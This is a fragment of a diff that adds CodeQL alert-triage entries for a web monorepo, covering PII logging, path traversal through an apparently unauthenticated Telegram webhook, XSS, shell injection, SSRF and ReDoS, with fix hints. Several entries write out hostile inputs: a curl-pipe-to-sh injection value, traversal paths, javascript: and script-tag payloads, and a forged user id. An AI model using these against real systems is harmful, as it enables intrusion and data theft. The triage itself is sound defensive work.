+   "reason": "_parse_date() is called with client_data.get('passport_expiry') and client_data.get('date_of_birth') (grep-confirmed call sites) \u2014 both client PII fields the org's own rules classify as sensitive (UU PDP). On a malformed submission, up to 32 raw chars of that value are logged in backend-prod. The code's own comment acknowledges this is a 'UU PDP audit' tradeoff.",
+   "fix_hint": "Log only the field name and error type; avoid echoing the raw client-submitted value for DOB/passport fields even truncated."
+  },
+  {
+   "number": 4795,
+   "path": "apps/backend-rag/scripts/import_historical_pdfs.py",
+   "line": 148,
+   "surface": "tooling",
+   "reason": "name is emp['employee_name'] parsed from a real bonus PDF \u2014 a real person's full name logged in clear text during a bulk data-import run.",
+   "fix_hint": "Log employee_id instead of the parsed name."
+  },
+  {
+   "number": 4794,
+   "path": "apps/backend-rag/scripts/import_historical_pdfs.py",
+   "line": 108,
+   "surface": "tooling",
+   "reason": "Logs a real client's name (it['client_name']) parsed from a bonus PDF, in clear text, during a dry-run sample preview.",
+   "fix_hint": "Log a client_id or index instead of the client's name."
+  },
+  {
+   "number": 4793,
+   "path": "apps/backend-rag/scripts/import_historical_pdfs.py",
+   "line": 108,
+   "surface": "tooling",
+   "reason": "Duplicate CodeQL alert for the same expression as #4794 (two sensitive sub-expressions on one line: client_name here, employee name at line 148 tracked separately).",
+   "fix_hint": "Same as #4794."
+  },
+  {
+   "number": 4792,
+   "path": "apps/backend-rag/scripts/import_historical_pdfs.py",
+   "line": 103,
+   "surface": "tooling",
+   "reason": "name is the employee's real full name (from parse_bonus_pdf), logged alongside their bonus total amount \u2014 real PII + financial data in clear text.",
+   "fix_hint": "Log employee_id instead of name; avoid combining name with salary/bonus amount in logs."
+  },
+  {
+   "number": 4791,
+   "path": "apps/backend-rag/scripts/import_historical_pdfs.py",
+   "line": 103,
+   "surface": "tooling",
+   "reason": "Duplicate CodeQL alert for the same line as #4792 (multiple sensitive sub-expressions).",
+   "fix_hint": "Same as #4792."
+  },
+  {
+   "number": 4673,
+   "path": "apps/backend-rag/backend/app/services/api_key_auth.py",
+   "line": 335,
+   "surface": "backend-prod",
+   "reason": "Only an 8-character prefix of the API key is logged (standard key-prefix masking pattern used elsewhere in this codebase, e.g. validation.py:46), not the full secret."
+  },
+  {
+   "number": 4672,
+   "path": "apps/backend-rag/backend/app/services/api_key_auth.py",
+   "line": 333,
+   "surface": "backend-prod",
+   "reason": "Same 8-char prefix masking as #4673."
+  },
+  {
+   "number": 4021,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 377,
+   "surface": "backend-prod",
+   "reason": "Same pattern as #6456/#6453 \u2014 logs the caller's own user_id/fact-count, mislabeled '(password)'. No credential value present."
+  },
+  {
+   "number": 4020,
+   "path": "apps/backend-rag/backend/app/streaming.py",
+   "line": 135,
+   "surface": "backend-prod",
+   "reason": "GET-endpoint twin of #4021. Same reasoning \u2014 no password/secret value."
+  },
+  {
+   "number": 4018,
+   "path": "apps/backend-rag/backend/app/routers/crm_enhanced.py",
+   "line": 366,
+   "surface": "backend-prod",
+   "reason": "Logs the client's OCR-extracted PASSPORT NUMBER in clear text at INFO level in backend-prod. Directly triggered whenever a client's passport document is auto-OCR'd via this endpoint \u2014 real client passport numbers land in production application logs, which this org's own CLAUDE.md explicitly forbids (PII/OSINT output boundary: 'mai KTP/passport/NPWP/client rows in chiaro').",
+   "fix_hint": "Never log the extracted passport number; log only a success boolean or last-4-digits if traceability is needed."
+  },
+  {
+   "number": 3595,
+   "path": "apps/backend-rag/scripts/batch_passport_ocr.py",
+   "line": 411,
+   "surface": "tooling",
+   "reason": "Logs a real client's name alongside their OCR-extracted PASSPORT NUMBER in clear text during a batch OCR run over actual client documents. Even though this is a local admin script, it processes and logs genuine client passport numbers for potentially the whole client base.",
+   "fix_hint": "Log client_id and a success flag; never the extracted passport_number itself."
+  },
+  {
+   "number": 3436,
+   "path": "apps/backend-rag/scripts/populate_companies_from_ocr.py",
+   "line": 147,
+   "surface": "tooling",
+   "reason": "col/val pairs include company NPWP (npwp_company), NIB, company_email/phone extracted from OCR'd legal documents (grep-confirmed call sites) \u2014 genuine business-registration identifiers logged in clear text during a local bulk-population script.",
+   "fix_hint": "Log only the column name, not the extracted value, on conflict."
+  },
+  {
+   "number": 3435,
+   "path": "apps/backend-rag/scripts/populate_companies_from_ocr.py",
+   "line": 144,
+   "surface": "tooling",
+   "reason": "Same col/val pairs as #3436 (npwp_company, nib, company_email, etc.) logged on successful field population.",
+   "fix_hint": "Log only the column name / success flag, not the value."
+  },
+  {
+   "number": 3434,
+   "path": "apps/backend-rag/scripts/populate_companies_from_ocr.py",
+   "line": 133,
+   "surface": "tooling",
+   "reason": "Date-field variant of #3435 (is_date branch) \u2014 same col/val logging pattern including potentially sensitive company registration dates.",
+   "fix_hint": "Same as #3435."
+  },
+  {
+   "number": 7799,
+   "path": "apps/backend-rag/backend/app/routers/intel_scraper.py",
+   "line": 1202,
+   "surface": "backend-prod",
+   "reason": "_publish_staging_item(type, item_id, ...) writes the staging file at staging_dir/f'{item_id}.json'. item_id reaches here via publish_staging_item_internal(intel_type, item_id, actor=...), whose ONLY production caller is telegram_webhook.py:185-189 inside the callback-vote quorum branch, where item_id is parsed straight out of callback_query['data'].split(':') \u2014 a JSON body field on POST /webhook/telegram. That route has zero request-origin verification (no Telegram secret-token check anywhere; verify_telegram_secret() exists in security/webhook_verifier.py but is never called), and is registered as a fully public endpoint in app/auth/public_endpoints.py. Any anonymous POST mimicking a Telegram update can set item_id to a traversal string and control this write's target path.",
+   "fix_hint": "Add Depends(verify_telegram_secret) (already implemented, unused) to the /webhook/telegram route, and independently validate item_id/intel_type parsed from callback_data against a strict allowlist regex before use (mirror preview.py::_validate_article_id)."
+  },
+  {
+   "number": 7798,
+   "path": "apps/backend-rag/backend/app/routers/intel_scraper.py",
+   "line": 1201,
+   "surface": "backend-prod",
+   "reason": "Same chain as line 1202 (staging_file = staging_dir / f'{item_id}.json'); item_id is attacker-controlled via the unauthenticated /webhook/telegram callback_data path (see finding 7799).",
+   "fix_hint": "Same as 7799."
+  },
+  {
+   "number": 7797,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 459,
+   "surface": "backend-prod",
+   "reason": "archive_item(intel_type, item_id, archive_type) builds file_path = staging_dir/f'{item_id}.json' and moves it. Reachable with a fully attacker-controlled item_id two ways: (1) POST /api/intel/staging/bulk-reject/{type} (intel.py:306-339) takes item_ids: list[str] straight from the JSON body with NO auth dependency at all (unlike bulk-approve, which has Depends(get_current_user)+_require_intel_admin) and passes each into archive_item; (2) telegram_webhook.py:228 calls archive_item(intel_type, item_id, 'rejected') with item_id parsed from the unauthenticated Telegram callback_data (see 7799). Either path lets an anonymous caller move/rename any *.json file the process can reach whose relative-traversal path they can guess, via item_id containing '../'.",
+   "fix_hint": "Require auth on bulk-reject (parity with bulk-approve), and validate item_id against ^[a-zA-Z0-9_-]+$ in IntelStagingService before any path join."
+  },
+  {
+   "number": 7796,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 459,
+   "surface": "backend-prod",
+   "reason": "Duplicate CodeQL alert on the same sink/line as 7797 (a second flow path through the same call, e.g. via archive_path's file_path.name component) \u2014 same root cause and same two reachable unauthenticated call chains (bulk-reject, telegram webhook).",
+   "fix_hint": "Same as 7797."
+  },
+  {
+   "number": 7795,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 451,
+   "surface": "backend-prod",
+   "reason": "Same archive_item() taint (file_path = staging_dir/f'{item_id}.json'), same two unauthenticated reachable chains as 7797 (bulk-reject JSON body, Telegram webhook callback_data).",
+   "fix_hint": "Same as 7797."
+  },
+  {
+   "number": 7794,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 204,
+   "surface": "backend-prod",
+   "reason": "load_staging_item(intel_type, item_id) builds file_path = staging_dir/f'{item_id}.json' and reads it. Reachable unauthenticated via POST /api/intel/staging/bulk-reject/{type} (item_ids from JSON body, no auth dependency) and via _publish_staging_item (called from the Telegram-webhook quorum path with a callback_data-derived item_id, see 7799). Lets an unauthenticated caller read the content of any *.json file reachable by relative traversal.",
+   "fix_hint": "Same as 7797 (auth + item_id allowlist)."
+  },
+  {
+   "number": 7793,
+   "path": "apps/backend-rag/backend/services/intel/intel_staging_service.py",
+   "line": 200,
+   "surface": "backend-prod",
+   "reason": "Same load_staging_item() taint/chain as 7794.",
+   "fix_hint": "Same as 7797."
+  },
+  {
+   "number": 6860,
+   "path": "apps/backend-rag/backend/app/routers/telegram_webhook.py",
+   "line": 133,
+   "surface": "backend-prod",
+   "reason": "status_file = pending_path / f'{item_id}.json' where item_id comes from callback_data.split(':') inside handle_intel_callback(), invoked from POST /webhook/telegram. I confirmed via grep that no code path (this file, app/dependencies.py) calls the existing verify_telegram_secret() helper from security/webhook_verifier.py, and public_endpoints.py registers '/webhook/telegram' as a public route with no verification note (unlike the WhatsApp/Instagram siblings, whose comments explicitly cite their verify tokens). An anonymous POST with a forged Telegram Update JSON containing callback_query.data='intel:approve:news:../../../x' reaches this line directly.",
+   "fix_hint": "Wire Depends(verify_telegram_secret) onto POST /webhook/telegram (checking X-Telegram-Bot-Api-Secret-Token) and validate item_id/intel_type with an allowlist regex before path construction."
+  },
+  {
+   "number": 6859,
+   "path": "apps/backend-rag/backend/app/routers/ingest.py",
+   "line": 166,
+   "surface": "backend-prod",
+   "reason": "POST /api/ingest/batch (batch_ingest) takes directory_path and file_patterns straight from the JSON body (BatchIngestionRequest) with no path restriction, then globs an attacker-chosen directory with attacker-chosen glob patterns. Gated by Depends(get_current_user) + _require_ingest_admin(current_user) \u2014 so exploitation requires an admin-privileged (or admin-session-compromised) caller, but there is no server-side confinement to a KB-ingestion directory, so an admin (or stolen admin token) can enumerate/ingest arbitrary filesystem paths readable by the container.",
+   "fix_hint": "Confine directory_path to an allowlisted ingestion root (resolve()+relative_to() check) even for admin callers, to bound the blast radius of a compromised admin session."
+  },
+  {
+   "number": 6858,
+   "path": "apps/backend-rag/backend/app/routers/ingest.py",
+   "line": 157,
+   "surface": "backend-prod",
+   "reason": "Same batch_ingest() taint as 6859 \u2014 directory = Path(request.directory_path), unrestricted, admin-gated only.",
+   "fix_hint": "Same as 6859."
+  },
+  {
+   "number": 6462,
+   "path": "apps/backend-rag/backend/services/intel/intel_cover_handler.py",
+   "line": 222,
+   "surface": "backend-prod",
+   "reason": "_upload_cover(intel_type, item_id, ...) builds item_file = staging_dir/f'{item_id}.json'. item_id can come from _match_article()'s Priority-2 path: a photo message whose caption starts with '/cover <item_id>' \u2014 that raw string (up to whitespace, from the Telegram message body) becomes item_id verbatim, no validation. This whole handler is gated only by 'if from_id != DAMAR_CHAT_ID: return None' (telegram_webhook.py/intel_cover_handler.py), and from_id is itself just a JSON field of the same unauthenticated /webhook/telegram POST (see 6860) \u2014 an attacker can forge from.id=1813875994 to impersonate Damar and supply an arbitrary item_id containing '../'.",
+   "fix_hint": "Fix the root cause (verify_telegram_secret on /webhook/telegram) and additionally validate item_id from the /cover caption against an allowlist regex before path construction."
+  },
+  {
+   "number": 3679,
+   "path": "apps/backend-rag/backend/services/intel/intel_cover_handler.py",
+   "line": 217,
+   "surface": "backend-prod",
+   "reason": "Same _upload_cover() chain as 6462 \u2014 arbitrary-path read via forged-Damar-caption item_id.",
+   "fix_hint": "Same as 6462."
+  },
+  {
+   "number": 3678,
+   "path": "apps/backend-rag/backend/services/intel/intel_cover_handler.py",
+   "line": 215,
+   "surface": "backend-prod",
+   "reason": "Same _upload_cover() chain as 6462.",
+   "fix_hint": "Same as 6462."
+  },
+  {
+   "number": 3677,
+   "path": "apps/backend-rag/backend/services/intel/intel_cover_handler.py",
+   "line": 210,
+   "surface": "backend-prod",
+   "reason": "image_path = covers_dir / f'{item_id}.jpg' \u2014 same forged-Damar item_id chain as 6462, but this sink WRITES attacker-influenced binary content (the uploaded photo bytes) to an attacker-chosen path.",
+   "fix_hint": "Same as 6462."
+  },
+  {
+   "number": 3350,
+   "path": "apps/backend-rag/backend/core/parsers.py",
+   "line": 213,
+   "surface": "backend-prod",
+   "reason": "extract_text_from_pdf()'s vision-fallback branch opens file_path with no restriction. file_path is threaded down unmodified from POST /api/ingest/file (ingest.py:118, BookIngestionRequest.file_path) and POST /api/legal/ingest (legal_ingest.py:103, LegalIngestRequest.file_path) \u2014 both admin-gated JSON-body strings, no directory confinement.",
+   "fix_hint": "Confine file_path to an allowlisted directory before it reaches parsers.py, same as 6859."
+  },
+  {
+   "number": 2837,
+   "path": "apps/backend-rag/backend/app/routers/telegram_webhook.py",
+   "line": 160,
+   "surface": "backend-prod",
+   "reason": "Same handle_intel_callback() chain as 6860 \u2014 writes attacker-influenced JSON (including the forged voter_id/voter_name) to an attacker-chosen path (status_file built from unvalidated item_id) via the unauthenticated /webhook/telegram POST.",
+   "fix_hint": "Same as 6860."
+  },
+  {
+   "number": 2836,
+   "path": "apps/backend-rag/backend/app/routers/telegram_webhook.py",
+   "line": 141,
+   "surface": "backend-prod",
+   "reason": "Same chain as 6860/2837 \u2014 arbitrary-path read of any reachable *.json file.",
+   "fix_hint": "Same as 6860."
+  },
+  {
+   "number": 382,
+   "path": "apps/backend-rag/backend/core/parsers.py",
+   "line": 551,
+   "surface": "backend-prod",
+   "reason": "get_document_info(file_path) \u2014 same unrestricted file_path parameter threaded from the admin-gated /api/ingest/file and /api/legal/ingest endpoints (see 3350). Read-only metadata (size) but still an unrestricted filesystem-path oracle.",
+   "fix_hint": "Same as 6859/3350."
+  },
+  {
+   "number": 381,
+   "path": "apps/backend-rag/backend/core/parsers.py",
+   "line": 519,
+   "surface": "backend-prod",
+   "reason": "auto_detect_and_parse(file_path) \u2014 same chain as 382.",
+   "fix_hint": "Same as 6859/3350."
+  },
+  {
+   "number": 380,
+   "path": "apps/backend-rag/backend/core/parsers.py",
+   "line": 492,
+   "surface": "backend-prod",
+   "reason": "extract_text_from_txt(file_path) \u2014 same chain as 382; this one actually reads and returns file content as ingestible text, the most impactful of the parsers.py sinks.",
+   "fix_hint": "Same as 6859/3350."
+  },
+  {
+   "number": 370,
+   "path": "apps/bali-intel-scraper/api/main.py",
+   "line": 652,
+   "surface": "other-app",
+   "reason": "upload_preview(request: PreviewUploadRequest) takes article_id from the JSON body (not a URL path segment, so Starlette's slash restriction does not apply) and builds preview_path = PREVIEW_DIR/f'{request.article_id}.html' with NO validation (unlike the backend-rag sibling preview.py, which has _validate_article_id). This FastAPI app (its own fly.toml/Dockerfile, and the code's own hardcoded default base URL 'https://bali-intel-scraper.fly.dev') has zero authentication anywhere (no Depends, no APIKeyHeader, no auth middleware \u2014 grepped the whole file). An anonymous POST with article_id='../../../../some/path/x' writes attacker-controlled HTML content to an attacker-chosen filesystem path ending in '.html'.",
+   "fix_hint": "Port the _validate_article_id() regex guard from backend-rag's preview.py, and add authentication to this app."
+  },
+  {
+   "number": 367,
+   "path": "apps/backend-rag/backend/services/ingestion/legal_ingestion_service.py",
+   "line": 369,
+   "surface": "backend-prod",
+   "reason": "ingest_legal_document()'s Drive-upload stage opens file_path (the same unrestricted, admin-gated JSON-body path threaded from POST /api/legal/ingest, see 3350) and uploads its raw bytes to Google Drive \u2014 turning an arbitrary local file read into off-box exfiltration via Drive, for an admin/compromised-admin caller.",
+   "fix_hint": "Same as 6859 (allowlist confinement) \u2014 note this specific sink also exfiltrates content off-host via Drive, raising impact."
+  },
+  {
+   "number": 366,
+   "path": "apps/backend-rag/backend/app/routers/legal_ingest.py",
+   "line": 103,
+   "surface": "backend-prod",
+   "reason": "POST /api/legal/ingest \u2014 request.file_path is an unrestricted JSON-body string, admin-gated via _require_ingest_admin only, no directory confinement (root of the 367/3350/380/381/382 chain).",
+   "fix_hint": "Same as 6859."
+  },
+  {
+   "number": 365,
+   "path": "apps/backend-rag/backend/services/ingestion/ingestion_logger.py",
+   "line": 147,
+   "surface": "backend-prod",
+   "reason": "_create_event(file_path=...) is called from the ingestion pipeline with the same unrestricted file_path values threaded from /api/ingest/* and /api/legal/ingest. Low-impact (only leaks file size into structured logs, wrapped in a broad except that swallows errors) but the same admin-gated unrestricted-path chain.",
+   "fix_hint": "Same as 6859; low priority given the read-only, size-only impact."
+  },
+  {
+   "number": 364,
+   "path": "apps/backend-rag/backend/services/ingestion/ingestion_logger.py",
+   "line": 146,
+   "surface": "backend-prod",
+   "reason": "Same _create_event() chain as 365 \u2014 file-existence oracle only.",
+   "fix_hint": "Same as 365."
+  },
+  {
+   "number": 361,
+   "path": "apps/backend-rag/backend/app/routers/ingest.py",
+   "line": 118,
+   "surface": "backend-prod",
+   "reason": "POST /api/ingest/file \u2014 request.file_path is an unrestricted JSON-body string (BookIngestionRequest.file_path), gated only by _require_ingest_admin(current_user), no directory confinement. This is the root of the parsers.py chain (3350/380/381/382).",
+   "fix_hint": "Same as 6859."
+  },
+  {
+   "number": 6278,
+   "path": "apps/mouth/src/proxy.ts",
+   "line": 219,
+   "surface": "frontend-prod",
+   "reason": "hostname = request.headers.get(\"host\") (proxy.ts:129) is fully client-controlled \u2014 any client can set an arbitrary Host header, and Vercel's *.vercel.app preview/prod alias will still invoke this same middleware with whatever Host the client sent. A Host like \"my.balizero.com.attacker.example\" or \"notmy.balizero.com\" satisfies .includes(\"my.balizero.com\") and flips isPortalDomain=true, which drives real redirect/rewrite decisions (route restriction to /portal/*, cross-origin redirect targets). This is genuine host-header-driven routing confusion, not a false alarm about unreachable code \u2014 though actual page-level auth (SSO cookie) is a separate layer so the payoff is routing/redirect confusion rather than an auth bypass.",
+   "fix_hint": "Replace .includes() with exact/suffix match: hostname === PORTAL_DOMAIN || hostname.endsWith(\".\" + PORTAL_DOMAIN) (strip a trailing :port first)."
+  },
+  {
+   "number": 6277,
+   "path": "apps/mouth/src/proxy.ts",
+   "line": 219,
+   "surface": "frontend-prod",
+   "reason": "Duplicate CodeQL alert (second data-flow path) for the same sink as #6278 \u2014 same Host-header-controlled taint, same reasoning.",
+   "fix_hint": "Same as #6278."
+  },
+  {
+   "number": 6276,
+   "path": "apps/mouth/src/proxy.ts",
+   "line": 214,
+   "surface": "frontend-prod",
+   "reason": "Same taint source (request.headers.get(\"host\"), line 129) reaches this isAppDomain classification unsanitized. A spoofed Host containing \"kita.balizero.com\" as a substring (e.g. \"kita.balizero.com.evil.example\") is classified as the internal app domain, driving rewrite/redirect logic (lines 394-490). Real impact is routing/redirect confusion, not an auth bypass, since actual session auth happens elsewhere.",
+   "fix_hint": "Exact/suffix match on hostname against APP_DOMAIN, same as other domain checks in this file."
+  },
+  {
+   "number": 6275,
+   "path": "apps/mouth/src/proxy.ts",
+   "line": 206,
+   "surface": "frontend-prod",
+   "reason": "Same client-controlled Host header (line 129) feeds this isPublicDomain check. .includes(PUBLIC_DOMAIN=\"balizero.com\") matches any Host containing that substring anywhere, e.g. \"balizero.com.attacker.example\" or \"notbalizero.com\". Drives public-content routing/redirect decisions for the whole file.",
+   "fix_hint": "Exact/suffix match, same fix family as the other 3 proxy.ts findings \u2014 ideally factor a single isDomain(hostname, domain) helper used everywhere in this file instead of ad hoc .includes()."
+  },
+  {
+   "number": 4876,
+   "path": "apps/mata-garuda/mata_garuda/tools/scraper_tools.py",
+   "line": 135,
+   "surface": "tooling",
+   "reason": "This is an explicit SSRF/egress allowlist gating a real network fetch (_curl_fetch -> subprocess curl on the raw url). The check is a bare prefix match with no boundary character, so \"https://peraturan.go.id.attacker.example/x\" or even \"https://peraturan.go.idXYZ.evil.com\" satisfies startswith(\"https://peraturan.go.id\") and passes the allowlist straight into a curl fetch of an attacker-chosen host. `url` is a parameter of an LLM-registered tool (@register_tool) invoked by the Mata Garuda agent loop, which is exactly the kind of surface where prompt-injected content (e.g. malicious text scraped from a prior page) can influence subsequent tool-call arguments \u2014 a realistic (if narrow, single-operator/local) SSRF path, not a network-facing prod endpoint.",
+   "fix_hint": "Parse with urllib.parse.urlsplit(url).hostname and compare exactly to \"peraturan.go.id\" (or endswith(\".peraturan.go.id\")), not a raw string prefix."
+  },
+  {
+   "number": 2144,
+   "path": "apps/mouth/src/lib/security/xss.ts",
+   "line": 87,
+   "surface": "frontend-prod",
+   "reason": "Even if href is attacker/CMS-controlled and crafted like \"http://evil.com/?x=balizero.com\" to be misclassified as internal, the only consequences are `target` and `rel` staying undefined together (both are gated by the same isExternalUrl boolean) \u2014 since target never becomes \"_blank\", there is no tabnabbing exposure from the missing rel=\"noopener noreferrer\". The actual protocol sanitization (blocking javascript:/data:/vbscript:) happens independently in sanitizeUrl(href) on the same href and is unaffected by this classification. Net effect of the bug is at most a missed nofollow/SEO signal, not a security bypass."
+  },
+  {
+   "number": 7585,
+   "path": "skills/bali-zero-brand/_damar-queue-server.py",
+   "line": 721,
+   "surface": "other-app",
+   "reason": "cmd is a Python list (no shell=True), so shell metacharacters in topic/audience/register/etc. (all from the POST body) are inert \u2014 they become literal argv bytes, not shell syntax. The code has an explicit documented guard (#1708): every user value is folded into a single `--flag=value` token (never `[\"--flag\", value]`), which structurally prevents argparse flag-smuggling/argument injection downstream. On top of that the HTTPServer binds 127.0.0.1 only (line 757, docstring 'Local-only... No external exposure') and validates the Origin header against localhost variants (lines 419-439) before honoring cross-origin POSTs. Three independent mitigations converge on the exact class this rule flags.",
+   "fix_hint": "None needed; if hardening further, validate topic/audience/register against an allow-list charset before building argv."
+  },
+  {
+   "number": 3479,
+   "path": "apps/mouth/src/app/portal/login-upgraded/page.tsx",
+   "line": 134,
+   "surface": "frontend-prod",
+   "reason": "redirectParam is read straight from the URL's `?redirect=` query string with zero validation (no same-origin/relative-path check, no protocol allow-list) and passed to `location.replace()`. An attacker can craft `https://.../portal/login-upgraded?redirect=javascript:alert(document.cookie)` (or an external phishing URL for open-redirect) and send it to a victim; after the victim submits real credentials on this genuine-looking login page, the script executes `location.replace('javascript:...')`, running attacker JS in the mouth.balizero.com origin (classic DOM-based javascript: URI XSS / open-redirect chain). httpOnly cookies limit direct cookie theft but same-origin JS can still perform authenticated actions, DOM manipulation, or credential/2FA phishing.",
+   "fix_hint": "Validate redirectTo is a same-origin relative path (e.g. starts with '/' and not '//', reject any value containing ':') before passing to location.replace."
+  },
+  {
+   "number": 2960,
+   "path": "apps/mouth/src/app/login/page.tsx",
+   "line": 105,
+   "surface": "frontend-prod",
+   "reason": "Identical unvalidated-redirect-parameter pattern as login-upgraded/page.tsx:134 (n=3479) \u2014 `redirectParam = urlParams.get(\"redirect\")` is used directly as redirectTo with no protocol/origin check, then handed to `location.replace()`. Same javascript:-URI DOM XSS / open-redirect exploit chain applies to this (the primary, non-upgraded) login page.",
+   "fix_hint": "Same fix as the sibling page: validate redirectTo is a same-origin relative path before calling location.replace."
+  },
+  {
+   "number": 2487,
+   "path": "apps/backend-rag/backend/app/routers/admin_zoho_auth.py",
+   "line": 269,
+   "surface": "backend-prod",
+   "reason": "GET /admin/zoho/debug-callback (lines 214-274) has NO authentication check whatsoever \u2014 unlike its siblings admin_zoho_auth (X-Admin-Secret header) and admin_zoho_callback (secret param), this endpoint takes `code`/`state`/`error` as plain query params and, if `code` is present, interpolates it unescaped directly into an HTML response body. Any unauthenticated attacker can craft `GET /admin/zoho/debug-callback?code=<script>...</script>` and get a victim (e.g. an admin who clicks a link) to execute arbitrary JS in the backend-rag origin. This is a genuine, trivially reachable reflective XSS on a production backend endpoint.",
+   "fix_hint": "html.escape(code) before interpolation, and/or add the same X-Admin-Secret gate the sibling endpoints already use; consider removing this debug endpoint from prod entirely."
+  },
+  {
+   "number": 2313,
+   "path": "apps/admin-dashboard/app/api/calendar/events/route.ts",
+   "line": 126,
+   "surface": "other-app",
+   "reason": "eventId and calendarId come straight from URL query params (searchParams.get) and are interpolated into a shell command string passed to child_process.exec (spawns /bin/sh -c) with only naive double-quote wrapping \u2014 no escaping. A value like `eventId=x\" ; curl evil.sh | sh ; \"` breaks out of the quotes and executes arbitrary shell commands on the admin-dashboard server. The route IS gated by middleware.ts requiring a valid admin JWT (role admin/super_admin/owner), so exploitation requires an authenticated admin session (or a hijacked one), but within that trust boundary this is straightforward RCE, not a benign pattern.",
+   "fix_hint": "Replace exec() with execFile(GOG_PATH, ['calendar','delete', calendarId, eventId, '--force']) \u2014 no shell, no escaping needed."
+  },
+  {
+   "number": 2312,
+   "path": "apps/admin-dashboard/app/api/calendar/events/route.ts",
+   "line": 99,
+   "surface": "other-app",
+   "reason": "summary/from/to/description/location/attendees all come from the parsed JSON request body and are concatenated into a shell command string with only double-quote wrapping, then passed to exec() (shell-invoking). Double-quoted shell strings still interpret `$()`/backticks for command substitution and can be broken out of with an embedded `\"`. Same admin-JWT-gated trust boundary as n=2313, same RCE class.",
+   "fix_hint": "Build an argv array and use execFile(GOG_PATH, [...]) instead of string-concatenated exec()."
+  },
+  {
+   "number": 2311,
+   "path": "apps/admin-dashboard/app/api/calendar/events/route.ts",
+   "line": 19,
+   "surface": "other-app",
+   "reason": "calendarId/days/max come directly from GET query params with zero validation/escaping and flow into a shell-invoked exec(). Same admin-JWT-gated RCE class as the other two handlers in this file.",
+   "fix_hint": "execFile(GOG_PATH, ['calendar','events', calendarId, '--days', days, '--max', max, '--json'])."
+  },
+  {
+   "number": 7783,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 371,
+   "surface": "backend-prod",
+   "reason": "BAB_PATTERN = r'^BAB\\s+([IVX]+|[A-Z]+|\\d+)\\s*\\n?\\s*(.+?)(?=\\n|$)'. The literal 'BAB' sits directly after the multiline anchor (no \\s* buffer before it), so a non-matching line-start is rejected in O(1) \u2014 unlike PASAL_PATTERN below. Empirically tested CodeQL's own suggested pump ('BAB I' + many repeated spaces) up to 320,000 chars: timing grows exactly 2x for every 2x input (clean O(n), not polynomial). Confirmed with growth-ratio measurement, not just a single data point.",
+   "fix_hint": "No fix needed for ReDoS; if still desired for defense-in-depth, cap document text length before parsing."
+  },
+  {
+   "number": 7782,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 337,
+   "surface": "backend-prod",
+   "reason": "PASAL_PATTERN = r'(?:^|\\n)\\s*Pasal\\s+(...)...'. The \\s* sits BETWEEN the multiline anchor and the literal 'Pasal', so at every one of the ~n newline-start positions the engine greedily eats forward looking for 'Pasal' and must backtrack char-by-char when it's absent \u2014 O(n) work at each of O(n) positions. Empirically confirmed via finditer on pure '\\n'*n text: n=2000\u21920.025s, n=8000\u21920.42s (~16x for 4x input = O(n\u00b2)), n=32000 timed out (>4s). Reachable: `text` here is document text produced by LegalIngestionService from a PDF uploaded via `POST /api/legal/upload` (admin-gated but real network path) or fetched from an operator-supplied external URL via `POST /api/legal/ingest-full`. `self.parser.parse(document_text)` in hierarchical_indexer.py:101 is called synchronously (no asyncio.to_thread) inside `async def index_legal_document`, so this blocks the whole nuzantara-rag event loop, not just the request. Thousands of blank lines are trivial to embed in a malformed/adversarial PDF.",
+   "fix_hint": "Remove the \\s* between the anchor and 'Pasal' (or restrict it to [ \\t]* excluding \\n), and/or offload parse() to asyncio.to_thread so a slow regex doesn't freeze the whole process; add a size/complexity guard on ingested document text."
+  },
+  {
+   "number": 7781,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 281,
+   "surface": "backend-prod",
+   "reason": "Same PASAL_PATTERN and same empirically-confirmed O(n\u00b2) blowup as #7782 (pure '\\n'*n text times out at n=32000 via finditer). This call operates on bab_text (a BAB-section slice of the same document), reached from the same admin-gated /api/legal/upload and /api/legal/ingest-full pipeline, synchronously inside the async event loop.",
+   "fix_hint": "Same as #7782: tighten \\s* to exclude \\n, or offload to a worker thread, or size-cap ingested text."
+  },
+  {
+   "number": 7778,
+   "path": "apps/backend-rag/backend/core/legal/structure_parser.py",
+   "line": 170,
+   "surface": "backend-prod",
+   "reason": "Same BAB_PATTERN as #7783, same empirical linear-growth result up to 320,000 chars.",
+   "fix_hint": "No fix needed."
+  },
+  {
+   "number": 7777,
+   "path": "apps/backend-rag/backend/core/legal/quality_validators.py",
+   "line": 133,
+   "surface": "backend-prod",
+   "reason": "Same vulnerable shape as PASAL_PATTERN: \\s* sits between the multiline anchor and the required literal '('. Empirically confirmed quadratic blowup on pure '\\n'*n text: n=2000\u21920.008s, n=8000\u21920.13s (~16x for 4x), n=32000\u21922.1s (~16x again) \u2014 clean O(n\u00b2). extract_ayat_numbers() is called from assess_document_quality(bab_full_text) in hierarchical_indexer.py, invoked synchronously in the same admin-gated /api/legal/upload \u2192 /api/legal/ingest-full pipeline as #7782, blocking the shared event loop.",
+   "fix_hint": "Same fix class: exclude \\n from the \\s* buffer between anchor and literal, or size-cap input, or run in a worker thread."
+  },
+  {
+   "number": 7773,
+   "path": "apps/backend-rag/backend/core/legal/chunker.py",
+   "line": 261,
+   "surface": "backend-prod",
+   "reason": "re.Pattern.split() scans the same way finditer does (retries at every candidate start position), inheriting PASAL_PATTERN's confirmed O(n\u00b2) blowup on pure-newline runs: n=2000\u21920.025s, n=8000\u21920.40s, n=32000 timed out (>4s), directly reproduced with .split() specifically. _split_by_pasal is called from LegalChunker.chunk(), which hierarchical_indexer.py calls (`await self.chunker.chunk(document_text, metadata)`) as a fallback/oversize path on the same document_text reached via the admin-gated legal-ingest endpoints, run synchronously inside the async pipeline.",
+   "fix_hint": "Same fix class as #7782: tighten the \\s* between anchor and 'Pasal' literal to exclude \\n, and/or size-cap document text before chunking."
+  },
+  {
+   "number": 7772,
+   "path": "apps/backend-rag/backend/core/legal/chunker.py",
+   "line": 146,
+   "surface": "backend-prod",
